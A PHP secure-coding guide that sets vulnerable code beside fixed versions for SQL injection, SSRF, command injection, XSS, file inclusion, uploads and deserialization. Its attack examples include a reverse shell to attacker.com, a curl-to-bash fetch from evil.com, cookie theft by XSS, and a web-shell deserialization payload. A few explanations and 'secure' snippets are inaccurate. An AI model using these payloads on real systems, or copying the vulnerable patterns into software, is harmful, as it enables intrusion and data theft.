# PHP Security Examples - Vulnerable vs Secure Code

## Complete Collection of Vulnerability Examples

---

## 1. SQL Injection

### ❌ VULNERABLE CODE

```php
<?php
// login.php - Vulnerable to SQL Injection
$username = $_POST['username'];
$password = $_POST['password'];

// Direct concatenation - DANGEROUS!
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);

if (mysqli_num_rows($result) > 0) {
    $_SESSION['logged_in'] = true;
    echo "Login successful!";
} else {
    echo "Invalid credentials";
}
?>
```

**Why it's vulnerable:**
- User input directly concatenated into SQL query
- Attacker can inject: `admin' OR '1'='1` as username
- Bypasses authentication completely
- Can extract database content

**Attack example:**
```
Username: admin' OR '1'='1' --
Password: anything
Result: Logged in as admin!
```

### ✅ SECURE CODE

```php
<?php
// login.php - Secure with Prepared Statements
$username = $_POST['username'];
$password = $_POST['password'];

// Use prepared statements with parameterized queries
$stmt = $conn->prepare("SELECT id, username, password_hash FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();

if ($row = $result->fetch_assoc()) {
    // Use password_verify for secure password comparison
    if (password_verify($password, $row['password_hash'])) {
        $_SESSION['user_id'] = $row['id'];
        $_SESSION['username'] = $row['username'];
        session_regenerate_id(true); // Prevent session fixation
        echo "Login successful!";
    } else {
        echo "Invalid credentials";
    }
} else {
    echo "Invalid credentials";
}

$stmt->close();
?>
```

**Security improvements:**
- ✅ Prepared statements prevent SQL injection
- ✅ Password hashing with `password_verify()`
- ✅ Session regeneration after login
- ✅ Same error message for user/password mismatch (prevents username enumeration)

---

## 2. Server-Side Request Forgery (SSRF)

### ❌ VULNERABLE CODE

```php
<?php
// image_proxy.php - Vulnerable to SSRF
$image_url = $_GET['url'];

// Directly fetching user-provided URL - DANGEROUS!
$image_data = file_get_contents($image_url);

header('Content-Type: image/jpeg');
echo $image_data;
?>
```

**Why it's vulnerable:**
- Accepts any URL from user
- Can access internal network resources
- Can scan internal ports
- Can read local files with file:// protocol

**Attack examples:**
```
?url=http://localhost:22       // Port scanning
?url=http://169.254.169.254/latest/meta-data/  // AWS metadata
?url=file:///etc/passwd        // Local file access
?url=http://internal-admin:8080/secret  // Internal services
```

### ✅ SECURE CODE

```php
<?php
// image_proxy.php - Secure with URL validation and whitelisting
$image_url = $_GET['url'];

// Define allowed domains (whitelist approach)
$allowed_domains = [
    'cdn.example.com',
    'images.example.com',
    'static.example.com'
];

// Parse and validate URL
$parsed_url = parse_url($image_url);

// Security checks
if (!$parsed_url || !isset($parsed_url['host'])) {
    die('Invalid URL');
}

// Only allow HTTPS protocol
if ($parsed_url['scheme'] !== 'https') {
    die('Only HTTPS URLs are allowed');
}

// Check if domain is whitelisted
if (!in_array($parsed_url['host'], $allowed_domains)) {
    die('Domain not allowed');
}

// Prevent access to internal IP ranges
$ip = gethostbyname($parsed_url['host']);
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
    die('Cannot access internal/private IP addresses');
}

// Use cURL with timeout and restrictions
$ch = curl_init();
curl_setopt_array($ch, [
    CURLOPT_URL => $image_url,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT => 5,
    CURLOPT_FOLLOWLOCATION => false, // Don't follow redirects
    CURLOPT_PROTOCOLS => CURLPROTO_HTTPS, // Only HTTPS
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_SSL_VERIFYHOST => 2
]);

$image_data = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($http_code === 200) {
    header('Content-Type: image/jpeg');
    echo $image_data;
} else {
    die('Failed to fetch image');
}
?>
```

**Security improvements:**
- ✅ Whitelist of allowed domains
- ✅ Protocol restriction (HTTPS only)
- ✅ IP address validation (blocks private/internal ranges)
- ✅ Timeout limits
- ✅ Disabled redirect following
- ✅ SSL verification enabled

---

## 3. Authentication Bypass

### ❌ VULNERABLE CODE

```php
<?php
// admin_check.php - Multiple authentication vulnerabilities
$admin_password = "secret123";
$user_password = $_POST['password'];

// Type juggling vulnerability - DANGEROUS!
if ($user_password == $admin_password) {
    $_SESSION['is_admin'] = true;
    echo "Admin access granted!";
}

// Vulnerable strcmp bypass
if (strcmp($_POST['token'], $secret_token) == 0) {
    $_SESSION['verified'] = true;
}

// Session fixation vulnerability
if (isset($_POST['username'])) {
    $_SESSION['username'] = $_POST['username'];
    $_SESSION['role'] = 'admin'; // Attacker can set this!
}

// Weak MD5 hash comparison
$stored_hash = "098f6bcd4621d373cade4e832627b4f6"; // MD5 of "test"
if (md5($_POST['password']) == $stored_hash) {
    $_SESSION['authenticated'] = true;
}
?>
```

**Why it's vulnerable:**
- Loose comparison (`==`) allows type juggling
- `strcmp()` returns NULL on array input, `NULL == 0` is true
- No session regeneration (session fixation)
- Weak MD5 hashing (fast, rainbow tables available)
- Direct session variable assignment from user input

**Attack examples:**
```php
// Type juggling attack
password=0  // "0" == "secret123" evaluates to false, but "0e123" == "0e456" is true for some hashes

// strcmp bypass
token[]=anything  // strcmp() returns NULL, NULL == 0 is true

// Session fixation
POST: username=admin&role=admin  // Attacker sets own role

// MD5 collision (for some values)
password=240610708  // MD5 collision exists for certain values
```

### ✅ SECURE CODE

```php
<?php
// admin_check.php - Secure authentication
session_start();

// Use strict comparison and proper password hashing
$stored_hash = '$2y$10$YourSecureHashHere'; // bcrypt hash
$user_password = $_POST['password'];

// Strict type comparison (===) prevents type juggling
if (password_verify($user_password, $stored_hash)) {
    // Regenerate session ID to prevent session fixation
    session_regenerate_id(true);
    
    $_SESSION['authenticated'] = true;
    $_SESSION['user_id'] = 1; // From database
    $_SESSION['created_at'] = time();
    $_SESSION['last_activity'] = time();
    
    echo "Access granted!";
} else {
    echo "Access denied!";
    // Optional: Log failed attempt
    error_log("Failed login attempt from " . $_SERVER['REMOTE_ADDR']);
}

// Secure token verification
$secret_token = bin2hex(random_bytes(32)); // Cryptographically secure
$user_token = $_POST['token'];

// Use hash_equals to prevent timing attacks
if (hash_equals($secret_token, $user_token)) {
    $_SESSION['verified'] = true;
}

// Session timeout check
if (isset($_SESSION['last_activity'])) {
    $inactive_time = time() - $_SESSION['last_activity'];
    if ($inactive_time > 1800) { // 30 minutes
        session_unset();
        session_destroy();
        die('Session expired');
    }
}
$_SESSION['last_activity'] = time();

// Role-based access control (proper way)
function checkAdmin() {
    if (!isset($_SESSION['authenticated']) || 
        !isset($_SESSION['user_id']) || 
        $_SESSION['role'] !== 'admin') {
        die('Unauthorized');
    }
}
?>
```

**Security improvements:**
- ✅ `password_verify()` with bcrypt (resistant to rainbow tables)
- ✅ Strict comparison (`===`) prevents type juggling
- ✅ `session_regenerate_id()` prevents session fixation
- ✅ `hash_equals()` prevents timing attacks
- ✅ Session timeout implementation
- ✅ Proper role validation from database, not user input

---

## 4. Command Injection

### ❌ VULNERABLE CODE

```php
<?php
// ping_tool.php - Vulnerable to Command Injection
$host = $_GET['host'];

// Direct user input in shell command - EXTREMELY DANGEROUS!
$output = shell_exec("ping -c 4 " . $host);

echo "<pre>$output</pre>";
?>
```

**Why it's vulnerable:**
- User input directly passed to shell
- No input validation or sanitization
- Allows arbitrary command execution

**Attack examples:**
```
?host=google.com; cat /etc/passwd
?host=google.com && whoami
?host=google.com | nc attacker.com 4444 -e /bin/bash  // Reverse shell
?host=`curl http://evil.com/malware.sh | bash`
```

### ✅ SECURE CODE

```php
<?php
// ping_tool.php - Secure implementation
$host = $_GET['host'];

// Whitelist validation - only allow valid hostnames/IPs
if (!filter_var($host, FILTER_VALIDATE_IP) && 
    !filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
    die('Invalid hostname or IP address');
}

// Additional validation: check for dangerous characters
if (preg_match('/[^a-zA-Z0-9.-]/', $host)) {
    die('Invalid characters in hostname');
}

// Use escapeshellarg for additional safety
$safe_host = escapeshellarg($host);

// Use exec() with output array (safer than shell_exec)
$output = [];
$return_var = 0;
exec("ping -c 4 -W 2 " . $safe_host . " 2>&1", $output, $return_var);

if ($return_var === 0) {
    echo "<pre>" . htmlspecialchars(implode("\n", $output)) . "</pre>";
} else {
    echo "Ping failed";
}
?>
```

**Even better approach - Avoid shell commands entirely:**

```php
<?php
// ping_tool.php - Best practice using PHP functions
$host = $_GET['host'];

// Validate IP or hostname
if (!filter_var($host, FILTER_VALIDATE_IP) && 
    !filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
    die('Invalid hostname or IP address');
}

// Use PHP's built-in functions instead of shell commands
function checkHost($host) {
    // DNS resolution
    $ip = gethostbyname($host);
    
    if ($ip === $host && !filter_var($host, FILTER_VALIDATE_IP)) {
        return "Could not resolve hostname";
    }
    
    // Use fsockopen for connectivity check (safer alternative)
    $port = 80;
    $timeout = 2;
    $fp = @fsockopen($ip, $port, $errno, $errstr, $timeout);
    
    if ($fp) {
        fclose($fp);
        return "Host $host ($ip) is reachable";
    } else {
        return "Host $host ($ip) is not reachable on port $port";
    }
}

echo htmlspecialchars(checkHost($host));
?>
```

**Security improvements:**
- ✅ Input validation with filters
- ✅ Character whitelist validation
- ✅ `escapeshellarg()` for shell safety
- ✅ Output escaping with `htmlspecialchars()`
- ✅ Best practice: Avoid shell commands completely
- ✅ Use native PHP functions when possible

---

## 5. Cross-Site Scripting (XSS)

### ❌ VULNERABLE CODE

```php
<?php
// comment.php - Vulnerable to XSS
$comment = $_POST['comment'];
$username = $_GET['user'];

// Direct output without escaping - DANGEROUS!
echo "Welcome, " . $username;
echo "<div class='comment'>" . $comment . "</div>";

// Vulnerable search functionality
$search_term = $_GET['q'];
echo "Search results for: " . $search_term;

// Vulnerable attribute injection
$color = $_GET['color'];
echo "<div style='color: $color'>Styled text</div>";
?>
```

**Why it's vulnerable:**
- User input directly echoed to page
- No HTML encoding
- Allows JavaScript injection
- Can steal cookies, redirect users, deface page

**Attack examples:**
```html
?user=<script>alert('XSS')</script>
?user=<img src=x onerror=alert(document.cookie)>
?q=<script>window.location='http://evil.com?cookie='+document.cookie</script>
?color=red;}</style><script>alert('XSS')</script>
```

### ✅ SECURE CODE

```php
<?php
// comment.php - Secure with proper encoding
$comment = $_POST['comment'];
$username = $_GET['user'];
$search_term = $_GET['q'];
$color = $_GET['color'];

// Encode all user input before output
echo "Welcome, " . htmlspecialchars($username, ENT_QUOTES, 'UTF-8');

// For HTML content, use htmlspecialchars
echo "<div class='comment'>" . htmlspecialchars($comment, ENT_QUOTES, 'UTF-8') . "</div>";

// For search results
echo "Search results for: " . htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8');

// For attribute values, validate and whitelist
$allowed_colors = ['red', 'blue', 'green', 'black'];
$safe_color = in_array($color, $allowed_colors) ? $color : 'black';
echo "<div style='color: " . htmlspecialchars($safe_color, ENT_QUOTES, 'UTF-8') . "'>Styled text</div>";

// Set Content Security Policy header
header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';");
?>
```

**Security improvements:**
- ✅ `htmlspecialchars()` encodes all output
- ✅ `ENT_QUOTES` encodes both single and double quotes
- ✅ UTF-8 encoding specified
- ✅ Whitelist validation for attributes
- ✅ Content Security Policy header

---

## 6. Local File Inclusion (LFI)

### ❌ VULNERABLE CODE

```php
<?php
// page.php - Vulnerable to LFI
$page = $_GET['page'];

// Direct file inclusion - DANGEROUS!
include($page . ".php");

// Another vulnerable pattern
$file = $_GET['file'];
$content = file_get_contents("uploads/" . $file);
echo $content;

// Vulnerable template system
$template = $_GET['template'];
require("templates/" . $template);
?>
```

**Why it's vulnerable:**
- User controls file path
- Can read sensitive files
- Can execute PHP code
- Directory traversal possible

**Attack examples:**
```
?page=../../etc/passwd
?page=../../../var/log/apache2/access.log
?file=../../../../etc/passwd
?template=../../config/database
```

### ✅ SECURE CODE

```php
<?php
// page.php - Secure with whitelist and validation
$page = $_GET['page'];

// Whitelist approach - only allow specific pages
$allowed_pages = [
    'home' => 'home.php',
    'about' => 'about.php',
    'contact' => 'contact.php',
    'products' => 'products.php'
];

if (array_key_exists($page, $allowed_pages)) {
    include($allowed_pages[$page]);
} else {
    include('404.php');
}

// Secure file reading with validation
$file = $_GET['file'];

// Remove directory traversal attempts
$file = basename($file); // Removes directory path

// Validate file extension
$allowed_extensions = ['txt', 'pdf', 'jpg', 'png'];
$extension = pathinfo($file, PATHINFO_EXTENSION);

if (!in_array($extension, $allowed_extensions)) {
    die('Invalid file type');
}

// Use realpath to resolve and validate path
$base_dir = realpath('uploads/');
$file_path = realpath($base_dir . '/' . $file);

// Ensure file is within allowed directory
if ($file_path === false || strpos($file_path, $base_dir) !== 0) {
    die('Invalid file path');
}

// Check if file exists and is readable
if (is_file($file_path) && is_readable($file_path)) {
    $content = file_get_contents($file_path);
    echo htmlspecialchars($content);
} else {
    die('File not found or not accessible');
}
?>
```

**Security improvements:**
- ✅ Whitelist of allowed pages
- ✅ `basename()` removes directory traversal
- ✅ Extension validation
- ✅ `realpath()` validates actual path
- ✅ Path prefix check ensures file is in allowed directory
- ✅ File existence and readability check

---

## 7. File Upload Vulnerabilities

### ❌ VULNERABLE CODE

```php
<?php
// upload.php - Vulnerable file upload
$target_dir = "uploads/";
$filename = $_FILES["file"]["name"];
$target_file = $target_dir . $filename;

// Direct upload without validation - DANGEROUS!
if (move_uploaded_file($_FILES["file"]["tmp_name"], $target_file)) {
    echo "File uploaded: " . $filename;
} else {
    echo "Upload failed";
}
?>
```

**Why it's vulnerable:**
- No file type validation
- Attacker can upload PHP shell
- No size limits
- Uses original filename (can contain path traversal)

**Attack examples:**
- Upload `shell.php` with malicious code
- Upload `../../etc/passwd` (path traversal)
- Upload massive files (DoS)
- Upload `.htaccess` to modify server config

### ✅ SECURE CODE

```php
<?php
// upload.php - Secure file upload implementation
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die('Invalid request method');
}

if (!isset($_FILES['file']) || $_FILES['file']['error'] !== UPLOAD_ERR_OK) {
    die('Upload error');
}

$file = $_FILES['file'];
$max_size = 5 * 1024 * 1024; // 5MB limit

// Security checks
// 1. Check file size
if ($file['size'] > $max_size) {
    die('File too large (max 5MB)');
}

// 2. Validate MIME type (with magic bytes, not just extension)
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime_type = $finfo->file($file['tmp_name']);

$allowed_types = [
    'image/jpeg',
    'image/png',
    'image/gif',
    'application/pdf'
];

if (!in_array($mime_type, $allowed_types)) {
    die('Invalid file type');
}

// 3. Validate file extension
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$original_name = basename($file['name']);
$extension = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));

if (!in_array($extension, $allowed_extensions)) {
    die('Invalid file extension');
}

// 4. Generate unique, safe filename
$new_filename = bin2hex(random_bytes(16)) . '.' . $extension;

// 5. Store outside web root or with .htaccess protection
$upload_dir = realpath(__DIR__ . '/uploads/');
$target_path = $upload_dir . '/' . $new_filename;

// 6. Move file with permission restrictions
if (move_uploaded_file($file['tmp_name'], $target_path)) {
    // Set restrictive permissions (read-only)
    chmod($target_path, 0644);
    
    // Store metadata in database
    // $db->insert([
    //     'original_name' => $original_name,
    //     'stored_name' => $new_filename,
    //     'mime_type' => $mime_type,
    //     'size' => $file['size'],
    //     'uploaded_at' => time()
    // ]);
    
    echo "File uploaded successfully: " . htmlspecialchars($original_name);
} else {
    die('Upload failed');
}
?>
```

**Additional security - .htaccess in uploads directory:**
```apache
# /uploads/.htaccess
# Prevent PHP execution in upload directory
<FilesMatch "\.ph(p[345]?|t|tml)$">
    Deny from all
</FilesMatch>

# Only allow specific file types
<FilesMatch "\.(jpg|jpeg|png|gif|pdf)$">
    Allow from all
</FilesMatch>
```

**Security improvements:**
- ✅ File size limits
- ✅ MIME type validation with magic bytes
- ✅ Extension whitelist
- ✅ Random filename generation
- ✅ `basename()` prevents path traversal
- ✅ Restrictive file permissions
- ✅ `.htaccess` blocks PHP execution
- ✅ Store uploads outside web root (when possible)

---

## 8. Insecure Deserialization

### ❌ VULNERABLE CODE

```php
<?php
// user_data.php - Vulnerable to object injection
class User {
    public $username;
    public $is_admin = false;
    
    function __destruct() {
        // Cleanup code - but can be exploited!
        if ($this->is_admin) {
            file_put_contents('/tmp/admin.log', $this->username);
        }
    }
}

// Vulnerable deserialization - DANGEROUS!
$user_data = $_COOKIE['user'];
$user = unserialize($user_data);

echo "Welcome, " . $user->username;
?>
```

**Why it's vulnerable:**
- Deserializes untrusted data
- Attacker can craft malicious objects
- Can trigger magic methods (`__destruct`, `__wakeup`)
- Can lead to code execution

**Attack example:**
```php
// Attacker creates malicious object
$evil = new User();
$evil->username = '<?php system($_GET["cmd"]); ?>';
$evil->is_admin = true;
$payload = serialize($evil);
// Set as cookie: user=O:4:"User":2:{s:8:"username";s:31:"...";s:8:"is_admin";b:1;}
```

### ✅ SECURE CODE

```php
<?php
// user_data.php - Secure data handling
class User {
    private $username;
    private $is_admin = false;
    
    // Don't use dangerous magic methods with user data
    // Use explicit methods instead
    
    public function setUsername($username) {
        // Validate input
        if (preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
            $this->username = $username;
        } else {
            throw new Exception('Invalid username format');
        }
    }
    
    public function getUsername() {
        return $this->username;
    }
}

// Use JSON instead of serialize for untrusted data
$user_data = $_COOKIE['user_data'];

// Validate JSON structure
$data = json_decode($user_data, true);

if (json_last_error() !== JSON_ERROR_NONE) {
    die('Invalid data format');
}

// Validate expected structure
if (!isset($data['username']) || !isset($data['user_id'])) {
    die('Invalid data structure');
}

// Verify session/token instead of trusting cookie
session_start();
if (!isset($_SESSION['user_id']) || $_SESSION['user_id'] !== $data['user_id']) {
    die('Unauthorized');
}

// Create object safely without deserialization
$user = new User();
$user->setUsername($data['username']);

echo "Welcome, " . htmlspecialchars($user->getUsername());
?>
```

**Even better - Use signed data:**

```php
<?php
// Secure approach with HMAC verification
function createSecureToken($data, $secret_key) {
    $json = json_encode($data);
    $hmac = hash_hmac('sha256', $json, $secret_key);
    return base64_encode($json . '|' . $hmac);
}

function verifySecureToken($token, $secret_key) {
    $decoded = base64_decode($token);
    list($json, $hmac) = explode('|', $decoded, 2);
    
    $expected_hmac = hash_hmac('sha256', $json, $secret_key);
    
    // Use hash_equals to prevent timing attacks
    if (!hash_equals($expected_hmac, $hmac)) {
        return false;
    }
    
    return json_decode($json, true);
}

// Usage
$secret_key = 'your-secret-key-here-min-32-chars';
$data = verifySecureToken($_COOKIE['user_token'], $secret_key);

if ($data === false) {
    die('Invalid or tampered token');
}

echo "Welcome, " . htmlspecialchars($data['username']);
?>
```

**Security improvements:**
- ✅ Use JSON instead of `serialize()` for untrusted data
- ✅ Never `unserialize()` user input
- ✅ Validate data structure
- ✅ Use HMAC for data integrity
- ✅ Session verification
- ✅ Avoid magic methods with user-controlled data

---

## Summary Table

| Vulnerability | Main Risk | Key Defense |
|---------------|-----------|-------------|
| **SQL Injection** | Database compromise | Prepared statements |
| **SSRF** | Internal network access | URL whitelisting |
| **Auth Bypass** | Unauthorized access | Strict comparison, password_verify() |
| **Command Injection** | System compromise | Avoid shell commands, validate input |
| **XSS** | Account hijacking | htmlspecialchars() |
| **LFI** | File disclosure | Whitelist, basename(), realpath() |
| **File Upload** | Code execution | MIME validation, random names |
| **Deserialization** | Object injection | Use JSON, verify data integrity |

---

## General Security Best Practices

### Input Validation
```php
// Always validate and sanitize user input
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
$age = filter_input(INPUT_POST, 'age', FILTER_VALIDATE_INT);
```

### Output Encoding
```php
// Always encode output
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
```

### Use Security Headers
```php
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");
header("Content-Security-Policy: default-src 'self'");
header("Strict-Transport-Security: max-age=31536000; includeSubDomains");
```

### Proper Error Handling
```php
// Never expose sensitive information in errors
ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
```

---

**Remember:** Security is layered. Use multiple defensive techniques together!
